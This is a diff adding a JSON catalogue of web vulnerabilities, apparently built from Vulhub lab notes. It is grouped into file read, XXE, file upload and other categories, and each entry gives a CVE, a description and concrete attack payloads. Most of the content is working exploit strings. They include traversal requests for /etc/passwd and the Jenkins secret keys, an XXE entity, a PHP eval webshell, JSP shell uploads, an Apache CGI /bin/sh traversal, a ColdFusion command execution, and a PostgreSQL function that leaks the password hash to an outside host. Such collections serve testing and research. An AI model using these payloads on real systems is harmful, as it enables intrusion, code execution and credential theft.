+        "http://your-ip:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
+        "%252e%252e/"
+      ]
+    },
+    {
+      "app": "rails",
+      "target": "CVE-2019-5418",
+      "description": "Path traversal vulnerability in Ruby on Rails via the Accept header in render file, allowing arbitrary file read.",
+      "payloads": [
+        "Accept: ../../../../../../../../etc/passwd{{"
+      ]
+    },
+    {
+      "app": "python",
+      "target": "CVE-2024-23334",
+      "description": "aiohttp's static file handler with follow_symlinks=True allows directory traversal via crafted paths, enabling unauthorized access to arbitrary files on the server.",
+      "payloads": [
+        "GET /static/../../../../../etc/passwd HTTP/1.1"
+      ]
+    },
+    {
+      "app": "phpmyadmin",
+      "target": "CVE-2018-12613",
+      "description": "A remote file inclusion vulnerability in phpMyAdmin 4.8.1 allows attackers to bypass checks via double encoding in the index.php target parameter, leading to arbitrary file reading.",
+      "payloads": [
+        "index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd",
+        "SELECT '<?=phpinfo()?>';",
+        "session file inclusion via phpMyAdmin cookie"
+      ]
+    },
+    {
+      "app": "phpmailer",
+      "target": "CVE-2017-5223",
+      "description": "PHPMailer versions before 5.2.18 allow arbitrary file read by embedding an <img> tag with a src attribute pointing to a local file path in email content, which PHPMailer extracts as an attachment.",
+      "payloads": [
+        "<img src=\"/etc/passwd\">",
+        "<img src=\"/etc/hosts\">"
+      ]
+    },
+    {
+      "app": "php",
+      "target": "inclusion",
+      "description": "The vulnerability involves exploiting a PHP file inclusion flaw by using phpinfo to reveal temporary file names, enabling remote code execution through conditional race conditions.",
+      "payloads": [
+        "/etc/passwd",
+        "<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>",
+        "webshell upload data packets with garbage headers and GET parameters"
+      ]
+    },
+    {
+      "app": "node",
+      "target": "CVE-2017-14849",
+      "description": "A directory traversal vulnerability in Node.js 8.5.0 due to a bug in the normalize function, allowing attackers to bypass path validation and read arbitrary files by manipulating path sequences with '..' and 'foo/../'.",
+      "payloads": [
+        "GET /static/../../../a/../../../../etc/passwd HTTP/1.1"
+      ]
+    },
+    {
+      "app": "nexus",
+      "target": "CVE-2024-4956",
+      "description": "Directory traversal vulnerability in Nexus Repository Manager 3 up to version 3.68.0 allows unauthenticated attackers to read arbitrary files on the server by exploiting path normalization issues in Jetty's URIUtil.canonicalPath() function.",
+      "payloads": [
+        "/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+      ]
+    },
+    {
+      "app": "n8n",
+      "target": "CVE-2026-21858",
+      "description": "The vulnerability allows unauthenticated arbitrary file read via Content-Type confusion in Form Webhook endpoints, where sending JSON requests with controlled filepath in files object bypasses multipart/form-data validation.",
+      "payloads": [
+        "POST /form/vulnerable-form HTTP/1.1\nHost: your-ip:5678\nContent-Type: application/json\n\n{\"data\":{},\"files\":{\"file1\":{\"filepath\":\"/etc/passwd\",\"originalFilename\":\"test.bin\",\"mimetype\":\"application/octet-stream\",\"size\":12345}}}"
+      ]
+    },
+    {
+      "app": "mini_httpd",
+      "target": "CVE-2018-18778",
+      "description": "The vulnerability allows arbitrary file reading by sending a request with an empty Host header and a path that becomes an absolute path due to a flaw in virtual host mode handling.",
+      "payloads": [
+        "GET /etc/passwd HTTP/1.1\nHost: ",
+        "Host: "
+      ]
+    },
+    {
+      "app": "metabase",
+      "target": "CVE-2021-41277",
+      "description": "Metabase versions 0.40.0 to 0.40.4 have a GeoJSON URL validation flaw that allows unauthenticated attackers to read arbitrary files on the server via a crafted file:// URL.",
+      "payloads": [
+        "http://your-ip:3000/api/geojson?url=file:////etc/passwd"
+      ]
+    },
+    {
+      "app": "librsvg",
+      "target": "CVE-2023-38633",
+      "description": "librsvg versions before 2.56.3 have a path traversal vulnerability in XInclude processing, allowing attackers to read arbitrary files via a malicious SVG image.",
+      "payloads": [
+        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<svg width=\"300\" height=\"300\" xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n  <rect width=\"300\" height=\"300\" style=\"fill:rgb(255,255,255);\" />\n  <text x=\"10\" y=\"100\">\n    <xi:include href=\".?../../../../../../../../../../etc/passwd\" parse=\"text\" encoding=\"UTF-8\">\n      <xi:fallback>file not found</xi:fallback>\n    </xi:include>\n  </text>\n</svg>"
+      ]
+    },
+    {
+      "app": "kibana",
+      "target": "CVE-2018-17246",
+      "description": "Kibana versions 5.6.13 to 6.4.3 have a local file inclusion vulnerability that allows attackers to include arbitrary files on the server, potentially leading to remote code execution if a malicious file is uploaded.",
+      "payloads": [
+        "http://your-ip:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd",
+        "/tmp/vulhub.js"
+      ]
+    },
+    {
+      "app": "jetty",
+      "target": "CVE-2021-28164",
+      "description": "The vulnerability allows attackers to bypass restrictions by using URL-encoded '.' characters (%2e) to access and download arbitrary files from the WEB-INF directory, leading to sensitive information disclosure.",
+      "payloads": [
+        "%2e/WEB-INF/web.xml"
+      ]
+    },
+    {
+      "app": "jetty",
+      "target": "CVE-2021-28169",
+      "description": "The vulnerability involves multiple decoding issues in Jetty Servlets' ConcatServlet and WelcomeFilter, allowing attackers to access sensitive files in the WEB-INF directory by using double URL encoding to bypass restrictions.",
+      "payloads": [
+        "/static?/%2557EB-INF/web.xml"
+      ]
+    },
+    {
+      "app": "jetty",
+      "target": "CVE-2021-34429",
+      "description": "A path traversal vulnerability in Jetty allows bypassing security restrictions to access sensitive files like WEB-INF/web.xml via crafted URLs with Unicode encoding or null byte combinations.",
+      "payloads": [
+        "/%u002e/WEB-INF/web.xml",
+        "/.%00/WEB-INF/web.xml",
+        "/a/b/..%00/WEB-INF/web.xml"
+      ]
+    },
+    {
+      "app": "jenkins",
+      "target": "CVE-2024-23897",
+      "description": "Jenkins CLI interface allows arbitrary file read via args4j library using '@' character to load files from the server.",
+      "payloads": [
+        "help 1 @/proc/self/environ",
+        "help 1 @/var/jenkins_home/secret.key",
+        "help 1 @/var/jenkins_home/secrets/master.key",
+        "connect-node @/etc/passwd"
+      ]
+    },
+    {
+      "app": "imagemagick",
+      "target": "CVE-2022-44268",
+      "description": "ImageMagick's PNG processing in versions up to 7.1.0-51 allows reading arbitrary files from the local filesystem by embedding a malicious tEXt chunk with a file path, which is then included in the output image during conversion.",
+      "payloads": [
+        "profile=/etc/passwd",
+        "tEXt chunk with file path in PNG"
+      ]
+    },
+    {
+      "app": "httpd",
+      "target": "CVE-2021-41773",
+      "description": "Apache HTTP Server 2.4.49 has a path traversal vulnerability that allows attackers to read files outside the web directory or execute arbitrary commands if CGI is enabled.",
+      "payloads": [
+        "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+      ]
+    },
+    {
+      "app": "httpd",
+      "target": "CVE-2021-42013",
+      "description": "Apache HTTP Server 2.4.50 has an incomplete fix for a path traversal vulnerability, allowing attackers to read files outside the web directory or execute arbitrary commands if CGI is enabled.",
+      "payloads": [
+        "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
+        "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
+      ]
+    },
+    {
+      "app": "grafana",
+      "target": "CVE-2021-43798",
+      "description": "Directory traversal vulnerability in Grafana's plugin module allows attackers to read arbitrary files on the server by using ../ sequences in file paths without proper validation.",
+      "payloads": [
+        "/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd"
+      ]
+    },
+    {
+      "app": "gradio",
+      "target": "CVE-2023-51449",
+      "description": "Gradio versions 4.11 and earlier allow unauthenticated attackers to access arbitrary files on the server via directory traversal in the file endpoint, exploiting a path traversal vulnerability.",
+      "payloads": [
+        "GET /file=/tmp/gradio/7c4a8d09ca3762af61e59520943dc26494f8941b/../../../../../../../../../../../../../../../etc/passwd HTTP/1.1"
+      ]
+    },
+    {
+      "app": "gradio",
+      "target": "CVE-2024-1561",
+      "description": "Gradio versions before 4.13 allow arbitrary file read via the component_server endpoint, where attackers can call the move_resource_to_block_cache method to copy server files to a temporary directory and access them.",
+      "payloads": [
+        "GET /config",
+        "POST /component_server with JSON: {\"component_id\": \"3\", \"data\": \"/etc/passwd\", \"fn_name\": \"move_resource_to_block_cache\", \"session_hash\": \"aaaaaaaaaaa\"}",
+        "GET /file=/tmp/gradio/916eb712d668cf14a35adf8179617549780c4070/passwd"
+      ]
+    },
+    {
+      "app": "glassfish",
+      "target": "CVE-2017-1000028",
+      "description": "GlassFish 4.1.0 has a vulnerability where improper handling of UTF-8 Overlong Encoding in URL decoding allows attackers to perform directory traversal and read arbitrary files on the system.",
+      "payloads": [
+        "https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+      ]
+    },
+    {
+      "app": "gitlab",
+      "target": "CVE-2016-9086",
+      "description": "GitLab's project import functionality in versions 8.9 and later mishandles symlinks in compressed archives, allowing authenticated users to read arbitrary files on the server.",
+      "payloads": [
+        "test.tar.gz"
+      ]
+    },
+    {
+      "app": "flink",
+      "target": "CVE-2020-17519",
+      "description": "Path traversal vulnerability in Apache Flink's JobManager REST interface allows reading arbitrary files via crafted URLs.",
+      "payloads": [
+        "http://your-ip:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
+      ]
+    },
+    {
+      "app": "ffmpeg",
+      "target": "CVE-2017-9993",
+      "description": "FFmpeg versions before 2.4.14, 2.8.12, 3.0.9, 3.1.9, 3.2.6, 3.3.2 have an arbitrary file read vulnerability due to improper handling of HTTP Live Streaming filename extensions and demuxer names, allowing attackers to read arbitrary files on the server via a crafted AVI video file.",
+      "payloads": [
+        "file:///etc/passwd",
+        "exp.avi"
+      ]
+    },
+    {
+      "app": "elasticsearch",
+      "target": "CVE-2015-3337",
+      "description": "Directory traversal vulnerability in ElasticSearch plugins allows reading arbitrary files via path traversal sequences in plugin URLs.",
+      "payloads": [
+        "http://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwd"
+      ]
+    },
+    {
+      "app": "elasticsearch",
+      "target": "CVE-2015-5531",
+      "description": "Directory traversal vulnerability in ElasticSearch snapshot and restore feature allows reading arbitrary files via crafted paths in snapshot requests.",
+      "payloads": [
+        "/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+      ]
+    },
+    {
+      "app": "discuz",
+      "target": "x3.4-arbitrary-file-deletion",
+      "description": "An arbitrary file deletion vulnerability in Discuz!X ≤3.4 allows attackers to delete arbitrary files on the server by exploiting the user profile modification feature through path traversal in form data.",
+      "payloads": [
+        "POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1 with multipart/form-data containing birthprovince=../../../robots.txt",
+        "formhash parameter in POST request",
+        "upload.html form with action to /home.php?mod=spacecp&ac=profile&op=base&profilesubmit=1&formhash=[form-hash]"
+      ]
+    },
+    {
+      "app": "coldfusion",
+      "target": "CVE-2010-2861",
+      "description": "Adobe ColdFusion 8 and 9 have a directory traversal vulnerability that allows unauthorized users to read arbitrary files on the server by manipulating the locale parameter.",
+      "payloads": [
+        "http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en",
+        "http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en"
+      ]
+    },
+    {
+      "app": "coldfusion",
+      "target": "CVE-2023-26360",
+      "description": "A local file inclusion vulnerability in Adobe ColdFusion allows attackers to read arbitrary files and execute arbitrary code by manipulating the _metadata parameter in requests to iedit.cfc.",
+      "payloads": [
+        "POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&_cfclient=true HTTP/1.1\nHost: localhost:8500\nContent-Type: application/x-www-form-urlencoded\n\n_variables={'_metadata':{'classname':'../../../../../../../../proc/self/environ'}}",
+        "POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&_cfclient=true HTTP/1.1\nHost: localhost:8500\nContent-Type: application/x-www-form-urlencoded\n\n_variables=<cfexecute name='id' outputFile='/tmp/success' ></cfexecute>"
+      ]
+    }
+  ],
+  "xxe": [
+    {
+      "app": "php",
+      "target": "php_xxe",
+      "description": "XML external entity injection vulnerability in PHP applications due to misconfigured XML parsers (libxml 2.8.0), allowing attackers to read local files, perform SSRF, or cause denial of service.",
+      "payloads": [
+        "<?xml version=\"1.0\" encoding=\"utf-8\"?> \n<!DOCTYPE xxe [\n<!ELEMENT name ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<root>\n<n>&xxe;</n>\n</root>",
+        "<!ENTITY xxe SYSTEM \"file:///path/to/sensitive/file\" >",
+        "<!ENTITY xxe SYSTEM \"http://internal.service.local\" >",
+        "<!ENTITY lol \"lol\">\n<!ENTITY lol2 \"&lol;&lol;\">\n<!ENTITY lol3 \"&lol2;&lol2;\">"
+      ]
+    }
+  ],
+  "file-upload": [
+    {
+      "app": "weblogic",
+      "target": "CVE-2018-2894",
+      "description": "Weblogic Web Service Test Page allows arbitrary file upload via configuration manipulation, enabling JSP webshell execution for remote code execution.",
+      "payloads": [
+        "/ws_utc/config.do",
+        "Work Home Dir set to /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css",
+        "/ws_utc/css/config/keystore/[时间戳]_[文件名]"
+      ]
+    },
+    {
+      "app": "tomcat",
+      "target": "CVE-2017-12615",
+      "description": "Tomcat PUT method allows arbitrary file write due to readonly=false configuration, enabling attackers to upload JSP shells by bypassing extension restrictions using trailing slashes.",
+      "payloads": [
+        "PUT /1.jsp/ HTTP/1.1",
+        "Host: your-ip:8080",
+        "Content-Type: application/x-www-form-urlencoded",
+        "Content-Length: 5",
+        "shell"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-066",
+      "description": "A path traversal vulnerability in Apache Struts2's file upload functionality allows attackers to bypass basename protection by using uppercase form field names and providing a separate field with a path traversal filename.",
+      "payloads": [
+        "POST /index.action HTTP/1.1 with multipart/form-data boundary, Content-Disposition: form-data; name=\"File\"; filename=\"shell.jsp\", Content-Disposition: form-data; name=\"fileFileName\" with value \"../shell.jsp\""
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-067",
+      "description": "The vulnerability exploits OGNL expression evaluation in parameter key names to overwrite the uploaded file's filename with a path traversal payload, allowing files to be uploaded outside the restricted directory.",
+      "payloads": [
+        "top.fileFileName",
+        "../shell.jsp"
+      ]
+    },
+    {
+      "app": "showdoc",
+      "target": "CNVD-2020-26585",
+      "description": "ShowDoc <= 2.8.6 has an unauthenticated arbitrary file upload vulnerability in the uploadImg endpoint due to improper file extension validation, allowing attackers to upload malicious files like PHP scripts to gain server control.",
+      "payloads": [
+        "POST /index.php?s=/home/page/uploadImg HTTP/1.1",
+        "multipart/form-data with filename=\"test.<>php\" and content <?=phpinfo();?>"
+      ]
+    },
+    {
+      "app": "rocketmq",
+      "target": "CVE-2023-37582",
+      "description": "The vulnerability allows arbitrary file write via the UPDATE_NAMESRV_CONFIG command in Apache RocketMQ NameServer, due to an incomplete fix for CVE-2023-33246 that misconfigured a blacklist.",
+      "payloads": [
+        "UPDATE_NAMESRV_CONFIG command",
+        "configStorePath configuration",
+        "path /tmp/success",
+        "content aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+      ]
+    },
+    {
+      "app": "nginx",
+      "target": "nginx_parsing_vulnerability",
+      "description": "Nginx misconfiguration allows files with multiple extensions (e.g., .jpg.php) to be executed as PHP when accessed with a .php suffix, enabling execution of malicious code uploaded as image files.",
+      "payloads": [
+        "file.jpg/.php",
+        "uploadfiles/nginx.png/.php"
+      ]
+    },
+    {
+      "app": "httpd",
+      "target": "apache_parsing_vulnerability",
+      "description": "Apache HTTPD's multi-suffix parsing feature allows files with multiple extensions to be executed based on any configured handler, bypassing upload restrictions that only check the last suffix.",
+      "payloads": [
+        "shell.php.jpg",
+        "shell.php.jpeg",
+        "malicious.php.jpg",
+        "apache.php.jpeg"
+      ]
+    },
+    {
+      "app": "httpd",
+      "target": "CVE-2017-15715",
+      "description": "Apache HTTPD 2.4.0 to 2.4.29 has a parsing vulnerability where files ending with a newline character (\\x0A) are interpreted as PHP files, allowing attackers to bypass security filters and upload malicious scripts.",
+      "payloads": [
+        "1.php\\x0A",
+        "/1.php%0a"
+      ]
+    },
+    {
+      "app": "flink",
+      "target": "CVE-2020-17518",
+      "description": "The vulnerability allows an attacker to upload files to arbitrary locations on the local filesystem by exploiting a path traversal in the HTTP header during file upload via the REST handler.",
+      "payloads": [
+        "POST /jars/upload HTTP/1.1",
+        "Content-Disposition: form-data; name=\"jarfile\"; filename=\"../../../../../../tmp/success\""
+      ]
+    },
+    {
+      "app": "elasticsearch",
+      "target": "WooYun-2015-110216",
+      "description": "ElasticSearch's backup repository feature allows arbitrary file upload to the filesystem via controlled location paths, enabling WebShell creation when combined with a web server like Tomcat.",
+      "payloads": [
+        "POST /yz.jsp/yz.jsp/1 with JSP payload",
+        "PUT /_snapshot/yz.jsp with location: /usr/local/tomcat/webapps/wwwroot/",
+        "PUT /_snapshot/yz.jsp/yz.jsp with indices: yz.jsp"
+      ]
+    },
+    {
+      "app": "activemq",
+      "target": "CVE-2016-3088",
+      "description": "ActiveMQ fileserver allows arbitrary file write via PUT and MOVE requests, enabling attackers to upload and move files to sensitive locations for exploitation.",
+      "payloads": [
+        "PUT /fileserver/2.txt HTTP/1.1",
+        "MOVE /fileserver/2.txt HTTP/1.1\nDestination: file:///opt/activemq/webapps/api/s.jsp",
+        "PUT /fileserver/1.txt HTTP/1.1"
+      ]
+    }
+  ],
+  "other": [
+    {
+      "app": "solr",
+      "target": "Remote-Streaming-Fileread",
+      "description": "Apache Solr allows enabling RemoteStreaming via configuration modification, leading to arbitrary file read and SSRF vulnerabilities when authentication is disabled.",
+      "payloads": [
+        "POST /solr/demo/config with JSON {\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}",
+        "GET /solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd"
+      ]
+    },
+    {
+      "app": "postgres",
+      "target": "CVE-2018-1058",
+      "description": "A privilege escalation vulnerability in PostgreSQL where a superuser can be tricked into executing malicious code created by a normal user, leading to unintended operations such as data exfiltration.",
+      "payloads": [
+        "CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$ select dblink_connect((select 'hostaddr=10.0.0.1 port=5433 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres'))); SELECT pg_catalog.array_to_string($1,$2); $$ LANGUAGE SQL VOLATILE;"
+      ]
+    },
+    {
+      "app": "polkit",
+      "target": "CVE-2021-4034",
+      "description": "A local privilege escalation vulnerability in Polkit's pkexec due to improper handling of arguments and environment variables, allowing attackers to hijack the GCONV_PATH environment variable and execute arbitrary code as root.",
+      "payloads": [
+        "GCONV_PATH environment variable hijack",
+        "argc==0 bug exploitation"
+      ]
+    },
+    {
+      "app": "php",
+      "target": "fpm",
+      "description": "PHP-FPM FastCGI interface is exposed without proper access controls, allowing unauthorized access and arbitrary PHP code execution via crafted FastCGI requests.",
+      "payloads": [
+        "FastCGI requests to port 9000",
+        "arbitrary PHP code in FastCGI payloads"
+      ]
+    },
+    {
+      "app": "openssl",
+      "target": "CVE-2014-0160",
+      "description": "OpenSSL Heartbleed vulnerability allows attackers to read sensitive memory data from the server, such as cookies, due to improper bounds checking in the TLS heartbeat extension.",
+      "payloads": [
+        "TLS heartbeat request with oversized payload"
+      ]
+    },
+    {
+      "app": "openssl",
+      "target": "CVE-2022-0778",
+      "description": "OpenSSL 1.1.1m and earlier have a logic flaw where an invalid elliptic curve parameter in a certificate triggers an infinite loop during parsing, leading to CPU exhaustion and denial of service.",
+      "payloads": [
+        "invalid elliptic curve parameter certificate"
+      ]
+    },
+    {
+      "app": "nginx",
+      "target": "CVE-2013-4547",
+      "description": "Nginx incorrectly parses URIs with spaces and null bytes, allowing attackers to bypass security restrictions and execute unauthorized files, such as PHP scripts, by manipulating filename resolution.",
+      "payloads": [
+        "1.gif[0x20][0x00].php",
+        "/test[0x20]/../admin/index.php"
+      ]
+    },
+    {
+      "app": "nginx",
+      "target": "CVE-2017-7529",
+      "description": "Integer overflow in Nginx range filter module allows reading beyond cache file boundaries via specially crafted Range headers, potentially exposing sensitive information like file headers and HTTP response headers.",
+      "payloads": [
+        "Range: bytes=-600, -9223372036854774591"
+      ]
+    },
+    {
+      "app": "nginx",
+      "target": "insecure-configuration",
+      "description": "Nginx configuration errors leading to CRLF injection, directory traversal, and header overwrite vulnerabilities.",
+      "payloads": [
+        "http://your-ip:8080/%0d%0aSet-Cookie:%20a=1",
+        "http://your-ip:8081/files../",
+        "/test2 location with add_header X-Content-Type-Options nosniff"
+      ]
+    },
+    {
+      "app": "minio",
+      "target": "CVE-2023-28432",
+      "description": "A vulnerability in MinIO cluster mode allows attackers to retrieve all environment variables, including sensitive credentials like MINIO_ROOT_USER and MINIO_ROOT_PASSWORD, by sending a POST request to a specific API endpoint.",
+      "payloads": [
+        "POST /minio/bootstrap/v1/verify HTTP/1.1",
+        "Content-Type: application/x-www-form-urlencoded",
+        "Content-Length: 0"
+      ]
+    },
+    {
+      "app": "ffmpeg",
+      "target": "CVE-2016-1897",
+      "description": "The vulnerability involves arbitrary file reading and SSRF in FFmpeg through malicious m3u8 playlist files, exploiting the concat protocol to access local files or external URLs.",
+      "payloads": [
+        "#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nhttp://collaborator/ssrf",
+        "#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:,\nhttp://collaborator/fileread?",
+        "concat:http://intermediate.example.com/intermediate.m3u8|subfile,,start,0,end,31,,:file:///etc/passwd|subfile,,start,32,end,63,,:file:///etc/passwd|subfile,,start,64,end,95,,:file:///etc/passwd|subfile,,start,96,end,127,,:file:///etc/passwd|subfile,,start,127,end,158,,:file:///etc/passwd\n#EXT-X-ENDLIST"
+      ]
+    },
+    {
+      "app": "dns",
+      "target": "dns-zone-transfer",
+      "description": "DNS zone transfer vulnerability due to misconfigured DNS servers allowing unauthorized AXFR requests, leading to exposure of all subdomain records.",
+      "payloads": [
+        "dig @your-ip -t axfr vulhub.org",
+        "nmap --script dns-zone-transfer.nse --script-args \"dns-zone-transfer.domain=vulhub.org\" -Pn -p 53 your-ip"
+      ]
+    },
+    {
+      "app": "django",
+      "target": "CVE-2018-14574",
+      "description": "Django versions before 2.0.8 and 1.11.15 have an open redirect vulnerability when CommonMiddleware and APPEND_SLASH are enabled, allowing attackers to craft URLs that redirect users to arbitrary external sites, potentially leading to phishing attacks.",
+      "payloads": [
+        "http://your-ip:8000//www.example.com"
+      ]
+    },
+    {
+      "app": "cgi",
+      "target": "CVE-2016-5385",
+      "description": "The vulnerability allows an attacker to inject a malicious HTTP Proxy header (e.g., Proxy: http://evil.com) into CGI/FastCGI environment variables, causing the application to use a specified proxy server and potentially leak sensitive data.",
+      "payloads": [
+        "Proxy: http://evil.com"
+      ]
+    },
+    {
+      "app": "adminer",
+      "target": "CVE-2021-43008",
+      "description": "A file read vulnerability in Adminer versions 1.12.0 to 4.6.2 due to MySQL LOAD DATA LOCAL, allowing attackers to read arbitrary files from the server by connecting to a malicious MySQL server.",
+      "payloads": [
+        "mysql-fake-server",
+        "fileread_/etc/passwd"
+      ]
+    },
+    {
+      "app": "openssl",
+      "target": "heartbleed",
+      "description": "The Heartbleed bug is a buffer over-read vulnerability in OpenSSL's TLS/DTLS heartbeat extension, allowing attackers to read sensitive memory contents from servers.",
+      "payloads": [
+        "Heartbeat request with oversized payload to trigger memory leak"
+      ]
+    },
+    {
+      "app": "imagemagick",
+      "target": "imagetragick",
+      "description": "The vulnerability is related to ImageMagick, known as imagetragick, but specific details are not provided in the truncated README; it references CVE-2016-3714.",
+      "payloads": []
+    },
+    {
+      "app": "fastjson",
+      "target": "vuln",
+      "description": "The provided README content is truncated and only indicates a move to another directory, lacking specific vulnerability details.",
+      "payloads": []
+    },
+    {
+      "app": "weblogic",
+      "target": "12.2.1.3",
+      "description": "The provided README does not contain vulnerability details; it only includes instructions for downloading and using a Weblogic 12.2.1.3 base image from Oracle's registry with a disclaimer.",
+      "payloads": []
+    },
+    {
+      "app": "httpd",
+      "target": "bad-http",
+      "description": "Apache HTTP server with a deprecated configuration that allows malicious characters in the HTTP HOST header, potentially leading to host header injection or other attacks.",
+      "payloads": [
+        "malicious characters in HTTP HOST header"
+      ]
+    }
+  ]
+}
